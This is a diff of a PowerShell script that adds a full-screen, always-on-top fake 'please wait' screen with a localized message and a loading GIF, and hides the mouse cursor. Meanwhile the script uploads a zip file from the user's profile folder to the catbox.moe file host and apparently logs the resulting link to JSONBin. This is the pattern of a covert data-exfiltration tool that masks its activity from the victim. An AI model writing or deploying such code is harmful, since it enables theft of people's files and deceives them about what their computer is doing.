@@ -1,29 +1,97 @@
 
+$zip = Join-Path $env:USERPROFILE "results\results.zip"
+$binId = "69dfd5efaaba882197022d02"
+
+Invoke-WebRequest "https://c.tenor.com/nVrOU5N9UZYAAAAd/tenor.gif" `
+-OutFile "$env:USERPROFILE\loading.gif"
 Add-Type -AssemblyName PresentationFramework
 
-$window = New-Object Windows.Window
-$window.WindowStyle = "None"
-$window.WindowState = "Maximized"
-$window.Background = "Black"
-$window.Topmost = $true
-$window.ShowInTaskbar = $false
+Add-Type -Path ".\WpfAnimatedGif.dll"
 
-$grid = New-Object Windows.Controls.Grid
-$label = New-Object Windows.Controls.TextBlock
-$label.Text = "Downloading..."
-$label.Foreground = "White"
-$label.FontSize = 28
-$label.HorizontalAlignment = "Center"
-$label.VerticalAlignment = "Center"
 
-$grid.Children.Add($label) | Out-Null
-$window.Content = $grid
+Add-Type -AssemblyName PresentationFramework
+
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class CursorUtil {
+    [DllImport("user32.dll")]
+    public static extern int ShowCursor(bool bShow);
+}
+"@
+
+[CursorUtil]::ShowCursor($false)
+
+# Detect system language
+$lang = [System.Globalization.CultureInfo]::CurrentUICulture.TwoLetterISOLanguageName
+
+# Simple translation map
+$text = switch ($lang) {
+    "hu" { "Egy pillanat" }
+    "de" { "Bitte warten" }
+    "fr" { "Veuillez patienter" }
+    "es" { "Espere un momento" }
+    "it" { "Attendere un momento" }
+    default { "Wait a moment" }
+}
+
+[xml]$xaml = @"
+<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+        WindowStyle="None"
+        WindowState="Maximized"
+        Background="#0078D7"
+        Topmost="True"
+        ShowInTaskbar="False">
+
+    <Grid>
+        <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center">
+
+           <Image Name="gifPlayer"
+       Width="140"
+       Height="140"/>
+
+            <TextBlock Name="txt"
+                       Foreground="White"
+                       FontSize="28"
+                       HorizontalAlignment="Center"/>
+
+        </StackPanel>
+    </Grid>
+</Window>
+"@
+
+$reader = New-Object System.Xml.XmlNodeReader $xaml
+$window = [Windows.Markup.XamlReader]::Load($reader)
+
+$gifPath = (Resolve-Path "$env:USERPROFILE\loading.gif").Path
+$gifPlayer = $window.FindName("gifPlayer")
+
+[WpfAnimatedGif.ImageBehavior]::SetAnimatedSource($gifPlayer, $gifPath)
+
+# Inject text after load
+$txt = $window.FindName("txt")
+$txt.Text = $text
+
+$window.Add_Closed({
+    [CursorUtil]::ShowCursor($true) | Out-Null
+})
+
+
 
 $window.Show()
 
-function Set-Stage($text) {
-    $window.Dispatcher.Invoke([action]{ $label.Text = $text })
+Start-Sleep -Milliseconds 200
+[System.Windows.Threading.Dispatcher]::Yield([System.Windows.Threading.DispatcherPriority]::Background)
+
+
+
+function Set-Stage($t) {
+    $window.Dispatcher.Invoke([action]{ $txt.Text = $t })
 }
+
+
 
 
 
@@ -40,8 +108,7 @@ cd $env:USERPROFILE
 
 
 
-$zip = Join-Path $env:USERPROFILE "results\results.zip"
-$binId = "69dfd5efaaba882197022d02"
+
 
 
 # ======================
@@ -49,15 +116,18 @@ $binId = "69dfd5efaaba882197022d02"
 # ======================
 Write-Host "Uploading to Catbox..."
 
-$link = (curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php).Trim()
+$response = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
+
+if (-not $response -or $response -match "error|html|404") {
+    Write-Host "Catbox ERROR RESPONSE:"
+    Write-Host $response
+    exit
+}
+
+$link = ($response | Select-Object -First 1).Trim()
 
 Write-Host "Catbox link: $link"
 
-if ([string]::IsNullOrWhiteSpace($link)) {
-    Write-Host "ERROR: Catbox failed"
-    Read-Host
-    exit
-}
 
 # ======================
 # JSONBIN
@@ -89,5 +159,6 @@ Set-Stage "Done"
 Start-Sleep 1
 
 $window.Dispatcher.Invoke([action]{ $window.Close() })
+[CursorUtil]::ShowCursor($true)
 
 
